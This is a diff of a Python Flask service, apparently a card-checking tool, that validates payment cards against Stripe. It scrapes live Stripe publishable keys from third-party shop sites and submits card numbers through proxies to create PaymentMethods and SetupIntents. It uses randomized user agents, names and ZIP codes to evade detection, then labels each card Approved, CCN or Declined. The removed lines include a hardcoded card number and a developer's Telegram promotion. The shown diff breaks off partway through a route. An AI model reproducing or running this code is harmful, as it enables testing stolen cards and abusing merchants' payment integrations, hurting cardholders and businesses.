@@ -9,52 +9,37 @@ import string
 import os
 import logging
 from datetime import timedelta
-# JOIN TELEGRAM 
-# Telegram: https://t.me/afuonax
-# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
-# JOIN TELEGRAM 
-# Telegram: https://t.me/afuonax
-# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
-# JOIN TELEGRAM 
-# Telegram: https://t.me/afuonax
-# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
-logging.basicConfig(level=logging.DEBUG)
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
-# JOIN TELEGRAM 
-# Telegram: https://t.me/afuonax
-# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
+
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
-# JOIN TELEGRAM 
-# Telegram: https://t.me/afuonax
-# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
-
 app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=24)
-app.config['SESSION_REFRESH_EACH_REQUEST'] = True
 app.config['DEBUG'] = False
 app.config['TESTING'] = False
 
-# JOIN TELEGRAM 
-# Telegram: https://t.me/afuonax
-# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
-TEST_CARD = "4031630422575208|01|2030|280"
-# JOIN TELEGRAM 
-# Telegram: https://t.me/afuonax
-# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
+API_KEY = "afuona_2026"
+
+# ── Sites with known Stripe public keys (used as fallback)
+# The checker scrapes live keys from sites automatically
+STRIPE_SITES = [
+    "prontoheat.com",
+    "sexywets.ca",
+]
+
 INDEX_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AFUONA API</title>
+    <title>STRIPE AUTH API</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family: 'Courier New', monospace;
             background: #0a0a0f;
@@ -63,794 +48,466 @@ INDEX_TEMPLATE = """
             display: flex;
             align-items: center;
             justify-content: center;
-            position: relative;
-            overflow: hidden;
         }
-
-        /* خلفية نجوم متحركة */
-        .stars {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(2px 2px at 10px 10px, #fff, rgba(0,0,0,0)),
-                        radial-gradient(2px 2px at 30px 40px, #4da6ff, rgba(0,0,0,0)),
-                        radial-gradient(2px 2px at 70px 80px, #fff, rgba(0,0,0,0)),
-                        radial-gradient(2px 2px at 100px 120px, #6ab0ff, rgba(0,0,0,0));
-            background-size: 200px 200px;
-            opacity: 0.3;
-            z-index: 0;
-        }
-
-        .container {
-            position: relative;
-            z-index: 10;
-            text-align: center;
-            padding: 20px;
-        }
-
+        .container { text-align:center; padding:20px; }
         .logo {
-            font-size: 4rem;
+            font-size: 3rem;
             font-weight: bold;
-            margin-bottom: 20px;
             background: linear-gradient(45deg, #00BFFF, #1E90FF);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 20px rgba(0,191,255,0.5);
+            margin-bottom: 10px;
         }
-
-        .name {
-            font-size: 2.5rem;
-            margin-bottom: 30px;
-            color: #b0e0ff;
-            text-shadow: 0 0 15px #4da6ff;
-            letter-spacing: 3px;
+        .sub { color: #b0e0ff; font-size:1.2rem; margin-bottom:30px; }
+        .endpoints {
+            background: rgba(0,191,255,0.05);
+            border: 1px solid #00BFFF33;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: left;
+            max-width: 500px;
+            margin: 0 auto;
         }
-
-        .telegram-link {
-            display: inline-flex;
-            align-items: center;
-            gap: 15px;
-            background: rgba(0,191,255,0.1);
-            border: 2px solid #00BFFF;
-            border-radius: 50px;
-            padding: 15px 40px;
-            font-size: 1.5rem;
-            color: #00BFFF;
-            text-decoration: none;
-            transition: all 0.3s;
-            margin-top: 20px;
-        }
-
-        .telegram-link:hover {
-            background: #00BFFF;
-            color: #0a0a0f;
-            transform: scale(1.05);
-            box-shadow: 0 0 30px #00BFFF;
-        }
-
-        .telegram-icon {
-            width: 30px;
-            height: 30px;
-            fill: currentColor;
-        }
-
-        .footer {
-            margin-top: 60px;
-            color: #3a5a68;
-            font-size: 0.9rem;
-        }
-
-        @keyframes glow {
-            from { text-shadow: 0 0 10px #4da6ff; }
-            to { text-shadow: 0 0 30px #00BFFF; }
-        }
+        .ep { margin: 8px 0; color: #4da6ff; font-size:0.9rem; }
+        .footer { margin-top:30px; color:#3a5a68; font-size:0.8rem; }
     </style>
 </head>
 <body>
-    <div class="stars"></div>
     <div class="container">
-        <div class="logo">𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔</div>
-        <div class="name">𝗔𝗣𝗜</div>
-        
-        <a href="https://t.me/afuonax" target="_blank" class="telegram-link">
-            <svg class="telegram-icon" viewBox="0 0 24 24">
-                <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.18-.357.287-.6.287l.21-3.07 5.58-5.05c.24-.21-.054-.33-.37-.12l-6.9 4.35-2.97-.99c-.64-.2-.66-.64.14-.96l11.64-4.47c.54-.2 1.01.13.83.96z"/>
-            </svg>
-        </a>
-        
-        <div class="footer">© 2026 AFUONA</div>
+        <div class="logo">⚡ STRIPE AUTH</div>
+        <div class="sub">Direct Stripe Authentication API</div>
+        <div class="endpoints">
+            <div class="ep">GET /process?key=&cc=&proxy=&site=</div>
+            <div class="ep">GET /mass?key=&cards=&proxy=&site=</div>
+            <div class="ep">GET /test_proxy?proxy=</div>
+            <div class="ep">GET /health</div>
+        </div>
+        <div class="footer">© 2026 Stripe Auth API</div>
     </div>
 </body>
 </html>
 """
 
-# JOIN TELEGRAM 
-# Telegram: https://t.me/afuonax
-# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔 
-@app.route('/')
-def home():
-    return render_template_string(INDEX_TEMPLATE)
-# JOIN TELEGRAM 
-# Telegram: https://t.me/afuonax
-# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
-@app.route('/process')
-def process_request():
-    try:
-        key = request.args.get('key')
-        domain = request.args.get('site')
-        cc = request.args.get('cc')
-        proxy_str = request.args.get('proxy')
-        
-        logger.debug(f"Process request: key={key}, domain={domain}, cc={cc}, proxy={proxy_str}")
-        
-        if key != "afuona_2026":
-            return jsonify({"error": "Invalid API key"}), 401
-        
-        if not domain:
-            return jsonify({"error": "Missing domain"}), 400
-        
-        if not cc:
-            return jsonify({"error": "Missing card"}), 400
-        
-        if not proxy_str:
-            return jsonify({"error": "Proxy is REQUIRED"}), 400
-        
-        domain = domain.replace('https://', '').replace('http://', '').split('/')[0]
-        
-        if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
-            return jsonify({"error": "Invalid card format. Use: NUMBER|MM|YY|CVV"}), 400
-        
-        proxy_dict = parse_proxy_format(proxy_str)
-        if not proxy_dict:
-            return jsonify({"error": "Invalid proxy format"}), 400
-        
-        result = process_card_enhanced(domain, cc, proxy_dict=proxy_dict)
-        
-        return jsonify({
-            "Response": result.get("Response", "Unknown"),
-            "Status": result.get("Status", "Unknown")
-        })
-        
-    except Exception as e:
-        logger.error(f"Process request error: {e}")
-        return jsonify({"error": str(e)}), 500
-# JOIN TELEGRAM 
-# Telegram: https://t.me/afuonax
-# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
-def parse_proxy_format(proxy):
-    """Parse all proxy formats"""
-    import re
-    
-    proxy = proxy.strip()
+
+# ══════════════════════════════════════════════════════════
+#  PROXY HELPERS
+# ══════════════════════════════════════════════════════════
+
+def parse_proxy(proxy_str):
+    """Parse all common proxy formats into requests dict."""
+    if not proxy_str:
+        return None
+    proxy_str = proxy_str.strip()
     proxy_type = 'http'
-    
-    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
-    if protocol_match:
-        proxy_type = protocol_match.group(1).lower()
-        proxy = protocol_match.group(2)
-    
-    host = ''
-    port = ''
-    username = ''
-    password = ''
-    
-    match = re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy)
-    if match:
-        username, password, host, port = match.groups()
-    elif re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy):
-        match = re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy)
-        host, port, username, password = match.groups()
-    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
-        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
-        host, port, username, password = match.groups()
-    elif re.match(r'^([^:@]+):(\d+)$', proxy):
-        match = re.match(r'^([^:@]+):(\d+)$', proxy)
-        host, port = match.groups()
-    else:
-        return None
-    
-    if not host or not port:
-        return None
-    
-    if username and password:
-        if proxy_type in ['socks5', 'socks4']:
-            proxy_url = f'{proxy_type}://{username}:{password}@{host}:{port}'
-        else:
-            proxy_url = f'http://{username}:{password}@{host}:{port}'
-    else:
-        if proxy_type in ['socks5', 'socks4']:
-            proxy_url = f'{proxy_type}://{host}:{port}'
-        else:
-            proxy_url = f'http://{host}:{port}'
-    
-    return {
-        'http': proxy_url,
-        'https': proxy_url
-    }
+
+    m = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy_str, re.IGNORECASE)
+    if m:
+        proxy_type = m.group(1).lower()
+        proxy_str = m.group(2)
+
+    # user:pass@host:port
+    m = re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy_str)
+    if m:
+        user, pw, host, port = m.groups()
+        url = f'{proxy_type}://{user}:{pw}@{host}:{port}'
+        return {'http': url, 'https': url}
+
+    # host:port:user:pass
+    m = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy_str)
+    if m:
+        host, port, user, pw = m.groups()
+        url = f'{proxy_type}://{user}:{pw}@{host}:{port}'
+        return {'http': url, 'https': url}
+
+    # host:port
+    m = re.match(r'^([^:@]+):(\d+)$', proxy_str)
+    if m:
+        host, port = m.groups()
+        url = f'{proxy_type}://{host}:{port}'
+        return {'http': url, 'https': url}
+
+    return None
+
 
 def test_proxy(proxy_dict):
-    """Test if proxy is working"""
     try:
-        response = requests.get(
+        r = requests.get(
             'https://api.ipify.org?format=json',
             proxies=proxy_dict,
             timeout=10,
             verify=False
         )
-        if response.status_code == 200:
-            ip_data = response.json()
-            return True, ip_data.get('ip')
-        return False, None
+        if r.status_code == 200:
+            return True, r.json().get('ip', 'unknown')
+        return False, 'Bad status'
     except Exception as e:
         return False, str(e)
 
+
+# ══════════════════════════════════════════════════════════
+#  STRIPE KEY SCRAPER
+# ══════════════════════════════════════════════════════════
+
 def get_stripe_key(domain, proxy_dict=None):
-    logger.debug(f"Getting Stripe key for domain: {domain}")
-    urls_to_try = [
+    """Scrape live Stripe publishable key from a site."""
+    urls = [
         f"https://{domain}/my-account/add-payment-method/",
+        f"https://{domain}/?wc-ajax=get_stripe_params",
         f"https://{domain}/checkout/",
-        f"https://{domain}/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params",
-        f"https://{domain}/?wc-ajax=get_stripe_params"
+        f"https://{domain}/",
     ]
-    
     patterns = [
-        r'pk_live_[a-zA-Z0-9_]+',
-        r'stripe_params[^}]*"key":"(pk_live_[^"]+)"',
-        r'wc_stripe_params[^}]*"key":"(pk_live_[^"]+)"',
-        r'"publishableKey":"(pk_live_[^"]+)"',
-        r'var stripe = Stripe[\'"]((pk_live_[^\'"]+))[\'"]'
+        r'(pk_live_[a-zA-Z0-9_]{20,})',
+        r'"publishableKey"\s*:\s*"(pk_live_[^"]+)"',
+        r'"key"\s*:\s*"(pk_live_[^"]+)"',
+        r"Stripe\(['\"]?(pk_live_[a-zA-Z0-9_]+)['\"]?\)",
     ]
-    
-    for url in urls_to_try:
+    headers = {'User-Agent': UserAgent().random}
+    for url in urls:
         try:
-            logger.debug(f"Trying URL: {url}")
-            response = requests.get(
-                url, 
-                headers={'User-Agent': UserAgent().random}, 
-                timeout=10, 
-                verify=False,
-                proxies=proxy_dict
-            )
-            if response.status_code == 200:
-                for pattern in patterns:
-                    match = re.search(pattern, response.text)
-                    if match:                
-                        key_match = re.search(r'pk_live_[a-zA-Z0-9_]+', match.group(0))
-                        if key_match:
-                            logger.debug(f"Found Stripe key: {key_match.group(0)}")
-                            return key_match.group(0)
+            r = requests.get(url, headers=headers, proxies=proxy_dict,
+                             timeout=10, verify=False)
+            if r.status_code == 200:
+                for pat in patterns:
+                    m = re.search(pat, r.text)
+                    if m:
+                        key = m.group(1)
+                        if key.startswith('pk_live_'):
+                            logger.info(f"Found key on {url}: {key[:20]}...")
+                            return key
         except Exception as e:
-            logger.error(f"Error getting Stripe key from {url}: {e}")
+            logger.debug(f"Error scraping {url}: {e}")
             continue
-    
-    logger.debug("No Stripe key found - site might be dead")
     return None
 
-def extract_nonce_from_page(html_content, domain):
-    logger.debug(f"Extracting nonce from {domain}")
-    patterns = [
-        r'createAndConfirmSetupIntentNonce["\']?:\s*["\']([^"\']+)["\']',
-        r'wc_stripe_create_and_confirm_setup_intent["\']?[^}]*nonce["\']?:\s*["\']([^"\']+)["\']',
-        r'name=["\']_ajax_nonce["\'][^>]*value=["\']([^"\']+)["\']',
-        r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)["\']',
-        r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)["\']',
-        r'var wc_stripe_params = [^}]*"nonce":"([^"]+)"',
-        r'var stripe_params = [^}]*"nonce":"([^"]+)"',
-        r'nonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']'
-    ]
-    
-    for pattern in patterns:
-        match = re.search(pattern, html_content)
-        if match:
-            logger.debug(f"Found nonce: {match.group(1)}")
-            return match.group(1)
-    
-    logger.debug("No nonce found")
-    return None
 
-def generate_random_credentials():
-    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-    email = f"{username}@gmail.com"
-    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
-    return username, email, password
+def find_working_key(site_override=None, proxy_dict=None):
+    """Try sites until we find a working Stripe key."""
+    sites = [site_override] if site_override else STRIPE_SITES
+    for site in sites:
+        site = site.replace('https://', '').replace('http://', '').split('/')[0]
+        key = get_stripe_key(site, proxy_dict)
+        if key:
+            return key, site
+    return None, None
 
-def register_account(domain, session, proxy_dict=None):
-    logger.debug(f"Registering account on {domain}")
-    try:        
-        reg_response = session.get(
-            f"https://{domain}/my-account/", 
-            verify=False,
-            proxies=proxy_dict
-        )
-                
-        reg_nonce_patterns = [
-            r'name="woocommerce-register-nonce" value="([^"]+)"',
-            r'name=["\']_wpnonce["\'][^>]*value="([^"]+)"',
-            r'register-nonce["\']?:\s*["\']([^"\']+)["\']'
-        ]
-        
-        reg_nonce = None
-        for pattern in reg_nonce_patterns:
-            match = re.search(pattern, reg_response.text)
-            if match:
-                reg_nonce = match.group(1)
-                break
-        
-        if not reg_nonce:
-            logger.debug("Could not extract registration nonce")
-            return False, "Could not extract registration nonce"
-                
-        username, email, password = generate_random_credentials()
-        
-        reg_data = {
-            'username': username,
-            'email': email,
-            'password': password,
-            'woocommerce-register-nonce': reg_nonce,
-            '_wp_http_referer': '/my-account/',
-            'register': 'Register'
-        }
-        
-        reg_result = session.post(
-            f"https://{domain}/my-account/",
-            data=reg_data,
-            headers={'Referer': f'https://{domain}/my-account/'},
-            verify=False,
-            proxies=proxy_dict
-        )
-        
-        if 'Log out' in reg_result.text or 'My Account' in reg_result.text:
-            logger.debug("Registration successful")
-            return True, "Registration successful"
-        else:
-            logger.debug("Registration failed")
-            return False, "Registration failed"
-            
-    except Exception as e:
-        logger.error(f"Registration error: {e}")
-        return False, f"Registration error: {str(e)}"
 
-def process_card_enhanced(domain, ccx, proxy_dict=None):
-    """ORIGINAL FUNCTION - KEPT EXACTLY"""
-    logger.debug(f"Processing card for domain: {domain}")
-    ccx = ccx.strip()
+# ══════════════════════════════════════════════════════════
+#  DIRECT STRIPE AUTH CHECKER
+# ══════════════════════════════════════════════════════════
+
+def stripe_auth(cc, proxy_dict=None, site_override=None):
+    """
+    Direct Stripe Auth — creates a PaymentMethod then attempts
+    a SetupIntent confirm to get a real bank response.
+    Returns: {"Status": "Approved|CCN|Declined", "Response": "...", "Site": "..."}
+    """
+    start = time.time()
+
+    # Parse card
     try:
-        n, mm, yy, cvc = ccx.split("|")
-    except ValueError:
-        logger.error("Invalid card format")
-        return {
-            "Response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
-            "Status": "Declined"
-        }
-    
-    if "20" in yy:
-        yy = yy.split("20")[1]
-    
-    user_agent = UserAgent().random
-    stripe_mid = str(uuid.uuid4())
-    stripe_sid = str(uuid.uuid4()) + str(int(time.time()))
+        parts = cc.strip().split('|')
+        if len(parts) != 4:
+            return {"Status": "Error", "Response": "Invalid card format", "Time": 0}
+        number, mm, yy, cvv = parts
+        number = number.strip()
+        mm = mm.strip().zfill(2)
+        yy = yy.strip()
+        if len(yy) == 4:
+            yy = yy[-2:]
+        cvv = cvv.strip()
+    except Exception as e:
+        return {"Status": "Error", "Response": f"Parse error: {e}", "Time": 0}
 
-    session = requests.Session()
-    session.headers.update({'User-Agent': user_agent})
-
-    stripe_key = get_stripe_key(domain, proxy_dict)
+    # Get Stripe key
+    stripe_key, site_used = find_working_key(site_override, proxy_dict)
     if not stripe_key:
-        return {
-            "Response": "Site does not have Stripe integration",
-            "Status": "Declined"
-        }
+        return {"Status": "Error", "Response": "No Stripe key found", "Time": 0}
 
-    registered, reg_message = register_account(domain, session, proxy_dict)
-        
-    payment_urls = [
-        f"https://{domain}/my-account/add-payment-method/",
-        f"https://{domain}/checkout/",
-        f"https://{domain}/my-account/"
-    ]
-    
-    nonce = None
-    for url in payment_urls:
-        try:
-            logger.debug(f"Trying to get nonce from: {url}")
-            response = session.get(url, timeout=10, verify=False, proxies=proxy_dict)
-            if response.status_code == 200:
-                nonce = extract_nonce_from_page(response.text, domain)
-                if nonce:
-                    break
-        except Exception as e:
-            logger.error(f"Error getting nonce from {url}: {e}")
-            continue
-    
-    if not nonce:
-        logger.error("Failed to extract nonce from site")
-        return {"Response": "Failed to extract nonce from site", "Status": "Declined"}
+    ua = UserAgent().random
+    guid  = str(uuid.uuid4())
+    muid  = str(uuid.uuid4())
+    sid   = str(uuid.uuid4()) + str(int(time.time()))
 
-    payment_data = {
+    # Step 1: Create PaymentMethod
+    pm_data = {
         'type': 'card',
-        'card[number]': n,
-        'card[cvc]': cvc,
-        'card[exp_year]': yy,
+        'card[number]': number,
         'card[exp_month]': mm,
-        'allow_redisplay': 'unspecified',
+        'card[exp_year]': yy,
+        'card[cvc]': cvv,
+        'billing_details[name]': _random_name(),
         'billing_details[address][country]': 'US',
-        'billing_details[address][postal_code]': '10080',
-        'billing_details[name]': 'Sahil Pro',
-        'pasted_fields': 'number',
-        'payment_user_agent': f'stripe.js/{uuid.uuid4().hex[:8]}; stripe-js-v3/{uuid.uuid4().hex[:8]}; payment-element; deferred-intent',
-        'referrer': f'https://{domain}',
-        'time_on_page': str(int(time.time()) % 100000),
+        'billing_details[address][postal_code]': _random_zip(),
+        'allow_redisplay': 'unspecified',
+        'payment_user_agent': f'stripe.js/{uuid.uuid4().hex[:8]}; stripe-js-v3; deferred-intent',
+        'referrer': f'https://{site_used}',
+        'time_on_page': str(random.randint(30000, 120000)),
         'key': stripe_key,
-        '_stripe_version': '2024-06-20',
-        'guid': str(uuid.uuid4()),
-        'muid': stripe_mid,
-        'sid': stripe_sid
+        'guid': guid,
+        'muid': muid,
+        'sid': sid,
     }
 
     try:
-        logger.debug("Creating payment method")
-        pm_response = requests.post(
+        pm_resp = requests.post(
             'https://api.stripe.com/v1/payment_methods',
-            data=payment_data,
+            data=pm_data,
             headers={
-                'User-Agent': user_agent,
-                'accept': 'application/json',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://js.stripe.com',
-                'referer': 'https://js.stripe.com/',
+                'User-Agent': ua,
+                'Accept': 'application/json',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Origin': 'https://js.stripe.com',
+                'Referer': 'https://js.stripe.com/',
             },
-            timeout=15,
-            verify=False,
-            proxies=proxy_dict
+            proxies=proxy_dict,
+            timeout=20,
+            verify=False
         )
-        pm_data = pm_response.json()
-
-        if 'id' not in pm_data:
-            error_msg = pm_data.get('error', {}).get('message', 'Unknown payment method error')
-            logger.error(f"Payment method error: {error_msg}")
-            return {"Response": error_msg, "Status": "Declined"}
-
-        payment_method_id = pm_data['id']
-        logger.debug(f"Payment method created: {payment_method_id}")
+        pm_json = pm_resp.json()
     except Exception as e:
-        logger.error(f"Payment Method Creation Failed: {e}")
-        return {"Response": f"Payment Method Creation Failed: {str(e)}", "Status": "Declined"}
-    
-    endpoints = [
-        {'url': f'https://{domain}/', 'params': {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}},
-        {'url': f'https://{domain}/wp-admin/admin-ajax.php', 'params': {}},
-        {'url': f'https://{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', 'params': {}}
-    ]
-    
-    data_payloads = [
-        {
-            'action': 'wc_stripe_create_and_confirm_setup_intent',
-            'wc-stripe-payment-method': payment_method_id,
-            'wc-stripe-payment-type': 'card',
-            '_ajax_nonce': nonce,
-        },
-        {
-            'action': 'wc_stripe_create_setup_intent',
-            'payment_method_id': payment_method_id,
-            '_wpnonce': nonce,
-        }
-    ]
+        return {"Status": "Error", "Response": f"PM creation failed: {str(e)[:60]}", "Time": round(time.time()-start, 2), "Site": site_used}
 
-    for endpoint in endpoints:
-        for data_payload in data_payloads:
-            try:
-                logger.debug(f"Trying endpoint: {endpoint['url']} with payload: {data_payload}")
-                setup_response = session.post(
-                    endpoint['url'],
-                    params=endpoint.get('params', {}),
-                    headers={
-                        'User-Agent': user_agent,
-                        'Referer': f'https://{domain}/my-account/add-payment-method/',
-                        'accept': '*/*',
-                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                        'origin': f'https://{domain}',
-                        'x-requested-with': 'XMLHttpRequest',
-                    },
-                    data=data_payload,
-                    timeout=15,
-                    verify=False,
-                    proxies=proxy_dict
-                )
-                                
-                try:
-                    setup_data = setup_response.json()
-                    logger.debug(f"Setup response: {setup_data}")
-                except:
-                    setup_data = {'raw_response': setup_response.text}
-                    logger.debug(f"Setup raw response: {setup_response.text}")
-              
-                if setup_data.get('success', False):
-                    data_status = setup_data['data'].get('status')
-                    if data_status == 'requires_action':
-                        logger.debug("3D authentication required")
-                        return {"Response": "3D", "Status": "Declined"}
-                    elif data_status == 'succeeded':
-                        logger.debug("Payment succeeded")
-                        return {"Response": "Card Added ", "Status": "Approved"}
-                    elif 'error' in setup_data['data']:
-                        error_msg = setup_data['data']['error'].get('message', 'Unknown error')
-                        logger.error(f"Payment error: {error_msg}")
-                        return {"Response": error_msg, "Status": "Declined"}
+    if 'id' not in pm_json:
+        err = pm_json.get('error', {})
+        msg = err.get('message', 'Payment method error')
+        code = err.get('code', '')
+        status, response = classify(msg, code)
+        return {"Status": status, "Response": response, "Time": round(time.time()-start, 2), "Site": site_used}
 
-                if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
-                    error_msg = setup_data['data']['error'].get('message', 'Unknown error')
-                    logger.error(f"Payment error: {error_msg}")
-                    return {"Response": error_msg, "Status": "Declined"}
+    pm_id = pm_json['id']
 
-                if setup_data.get('status') in ['succeeded', 'success']:
-                    logger.debug("Payment succeeded")
-                    return {"Response": "Card Added", "Status": "Approved"}
+    # Step 2: Create SetupIntent
+    si_data = {
+        'payment_method_types[]': 'card',
+        'payment_method': pm_id,
+        'confirm': 'true',
+        'key': stripe_key,
+        'guid': guid,
+        'muid': muid,
+        'sid': sid,
+    }
 
-            except Exception as e:
-                logger.error(f"Setup error: {e}")
-                continue
-
-    logger.error("All payment attempts failed")
-    return {"Response": "All payment attempts failed", "Status": "Declined"}
-
-def test_site_with_card(domain, proxy_dict):
-    """Test site with hidden card"""
     try:
-        stripe_key = get_stripe_key(domain, proxy_dict)
-        if not stripe_key:
-            return {
-                "domain": domain,
-                "working": False,
-                "status": "NO_STRIPE",
-                "response": "Site has no Stripe integration"
-            }
-        
-        result = process_card_enhanced(domain, TEST_CARD, proxy_dict=proxy_dict)
-        
-        if result["Status"] == "Approved":
-            return {
-                "domain": domain,
-                "working": True,
-                "status": "LIVE",
-                "response": result["Response"]
-            }
-        elif "insufficient" in result["Response"].lower():
-            return {
-                "domain": domain,
-                "working": True,
-                "status": "NO BALANCE",
-                "response": result["Response"]
-            }
-        elif "3d" in result["Response"].lower() or "secure" in result["Response"].lower():
-            return {
-                "domain": domain,
-                "working": True,
-                "status": "3D",
-                "response": result["Response"]
-            }
-        elif "declined" in result["Response"].lower():
-            return {
-                "domain": domain,
-                "working": True,
-                "status": "DECLINED",
-                "response": result["Response"]
-            }
-        else:
-            return {
-                "domain": domain,
-                "working": True,
-                "status": "UNKNOWN",
-                "response": result["Response"]
-            }
-            
+        si_resp = requests.post(
+            'https://api.stripe.com/v1/setup_intents',
+            data=si_data,
+            headers={
+                'User-Agent': ua,
+                'Accept': 'application/json',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Origin': 'https://js.stripe.com',
+                'Referer': 'https://js.stripe.com/',
+            },
+            proxies=proxy_dict,
+            timeout=20,
+            verify=False
+        )
+        si_json = si_resp.json()
     except Exception as e:
-        return {
-            "domain": domain,
-            "working": False,
-            "status": "DEAD",
-            "response": str(e)
-        }
+        return {"Status": "Error", "Response": f"SetupIntent failed: {str(e)[:60]}", "Time": round(time.time()-start, 2), "Site": site_used}
 
-# JOIN TELEGRAM 
-# Telegram: https://t.me/afuonax
-# DEVELOPER: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
-@app.route('/test_site')
-def test_site_request():
+    elapsed = round(time.time() - start, 2)
+
+    si_status = si_json.get('status', '')
+    err = si_json.get('error', {})
+    last_err = si_json.get('last_setup_error', {})
+
+    # Check next_action for 3DS
+    if si_json.get('next_action') or si_status == 'requires_action':
+        return {"Status": "3D", "Response": "3D Secure Authentication Required", "Time": elapsed, "Site": site_used}
+
+    if si_status == 'succeeded':
+        return {"Status": "Approved", "Response": "Approved ✅✅", "Time": elapsed, "Site": site_used}
+
+    # Parse error from SetupIntent
+    error_obj = err if err else last_err
+    msg  = error_obj.get('message', '')
+    code = error_obj.get('code', '')
+    decline_code = error_obj.get('decline_code', '')
+
+    if not msg:
+        # Try top-level error
+        msg  = si_json.get('error', {}).get('message', 'Unknown error')
+        code = si_json.get('error', {}).get('code', '')
+
+    status, response = classify(msg, code, decline_code)
+    return {"Status": status, "Response": response, "Time": elapsed, "Site": site_used}
+
+
+def classify(msg, code='', decline_code=''):
+    """Map Stripe error to Status + clean Response."""
+    m  = msg.lower()
+    c  = code.lower()
+    dc = decline_code.lower()
+
+    # CCN — security code incorrect
+    if any(k in m for k in ['security code', 'cvc', 'cvv', 'security_code_incorrect',
+                              'incorrect_cvc', 'card_incorrect_cvc']) or \
+       c in ('incorrect_cvc', 'security_code_incorrect') or \
+       dc in ('incorrect_cvc', 'security_code_incorrect'):
+        return "CCN", "Your Security Code is Incorrect"
+
+    # 3D Secure
+    if any(k in m for k in ['authentication', '3d', 'three_d', 'secure']):
+        return "3D", "3D Secure Authentication Required"
+
+    # Approved
+    if any(k in m for k in ['succeeded', 'approved', 'success']):
+        return "Approved", "Approved ✅✅"
+
+    # Declined — return the real Stripe message
+    clean = msg.strip() if msg.strip() else "Your card was declined"
+    # Capitalise first letter
+    clean = clean[0].upper() + clean[1:] if clean else clean
+    return "Declined", clean
+
+
+def _random_name():
+    first = random.choice(['James','John','Robert','Michael','William','David',
+                           'Richard','Joseph','Thomas','Charles','Emily','Emma',
+                           'Sophia','Isabella','Mia','Olivia','Ava','Charlotte'])
+    last  = random.choice(['Smith','Johnson','Williams','Jones','Brown','Davis',
+                           'Miller','Wilson','Moore','Taylor','Anderson','Thomas'])
+    return f"{first} {last}"
+
+
+def _random_zip():
+    return str(random.randint(10000, 99999))
+
+
+# ══════════════════════════════════════════════════════════
+#  ROUTES
+# ══════════════════════════════════════════════════════════
+
+@app.route('/')
+def home():
+    return render_template_string(INDEX_TEMPLATE)
+
+
+@app.route('/process')
+def process_request():
     try:
-        key = request.args.get('key')
-        domain = request.args.get('site')
+        key       = request.args.get('key')
+        cc        = request.args.get('cc')
         proxy_str = request.args.get('proxy')
-        
-        if key != "afuona_2026":
+        site      = request.args.get('site', '')
+
+        if key != API_KEY:
             return jsonify({"error": "Invalid API key"}), 401
-        
-        if not domain:
-            return jsonify({"error": "Missing domain"}), 400
-        
+        if not cc:
+            return jsonify({"error": "Missing card"}), 400
         if not proxy_str:
-            return jsonify({"error": "Proxy is REQUIRED"}), 400
-        
-        domain = domain.replace('https://', '').replace('http://', '').split('/')[0]
-        
-        proxy_dict = parse_proxy_format(proxy_str)
+            return jsonify({"error": "Proxy is required"}), 400
+
+        if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc.strip()):
